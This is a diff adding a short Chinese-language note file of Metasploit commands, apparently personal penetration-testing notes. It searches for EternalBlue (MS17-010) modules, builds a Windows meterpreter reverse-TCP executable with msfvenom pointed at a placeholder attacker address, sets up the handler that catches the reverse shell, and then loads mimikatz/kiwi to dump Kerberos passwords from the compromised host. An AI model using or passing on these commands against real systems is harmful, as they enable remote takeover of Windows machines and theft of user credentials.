@@ -1,0 +1,13 @@
+msfconsole
+search ms17-010 命令来搜索MSF中有关永恒之蓝漏洞的模块
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=kali_ip lport=9999 -f exe >shell.exe
+
+
+use exploit/multi/handler #加载模块
+set payload windows/meterpreter/reverse_tcp
+set lhost kali_ip
+set lport 9999 #设置监听端口
+
+可以看到MSF提示给了我们WIN字样，即成功，并反弹了一个meterpreter会话给用户输入load mimikatz或load kiwi 命令加载MSF内置的猕猴桃插件
+输入creds_Kerberos来抓取目标主机的用户密码（笔者的msf是msf6所以命令稍稍不同，如果是msf5的话命令为Kerberos）
